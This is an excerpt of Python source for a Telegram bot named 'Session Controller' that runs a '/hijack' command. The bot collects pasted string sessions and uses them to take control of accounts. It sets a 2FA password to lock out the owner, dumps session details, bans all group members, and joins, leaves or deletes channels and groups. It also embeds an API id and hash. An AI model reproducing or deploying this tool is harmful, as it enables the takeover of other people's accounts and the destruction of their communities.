...
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('Session Controller OP')
      return True
    except:
      return False
...
async def op(event):
  ...
  if not event.is_private:
    await event.reply("Sorry, this bot works only in pm")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/hijack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("Sorry, this bot works only in pm")
@client.on(events.NewMessage(pattern="/hijack", func = lambda x: x.is_private))
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      if len(i) > 3855:
        ...
        file.write(i + "\n\nDETAILS BY Session Controller")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nThanks For using Session Controller Bot")
    elif res.text == "B":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Banning all members Thanks For using Session Controller Bot")
    elif r == "D":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Joined the Channel/Group Thanks For using Session Controller Bot")
    elif r == "F":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Leaved the Channel/Group Thanks For using Session Controller Bot")
    elif r == "G":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Deleted the Channel/Group Thanks For using Session Controller Bot")
    elif r == "H":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.respond("Wrong Text Found Re type /hijack and use")
